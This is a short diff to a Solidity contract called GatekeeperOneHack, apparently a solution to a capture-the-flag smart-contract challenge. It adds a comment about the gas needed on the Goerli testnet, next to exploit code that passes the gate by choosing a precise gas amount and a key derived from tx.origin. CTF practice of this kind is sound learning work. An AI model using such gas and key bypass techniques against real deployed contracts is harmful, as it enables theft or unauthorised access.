@@ -14,6 +14,7 @@ contract GatekeeperOneHack {
         // Hence 10000 - 1541 = 8459 gives out of gas
         // 8459 + 8191 = 16650 gives out of gas
         // 16650 + 8191 = 24841 works fine
+        // Note: there seems to be some diff in gas usage in goerli. Had to use 24829 gas
         IGatekeeperOne(gatekeeperOneAddress).enter{gas: 24841}(
             bytes8(uint64(uint32(uint16(uint160(tx.origin))))) | bytes8(bytes4(0x00000011))
         );
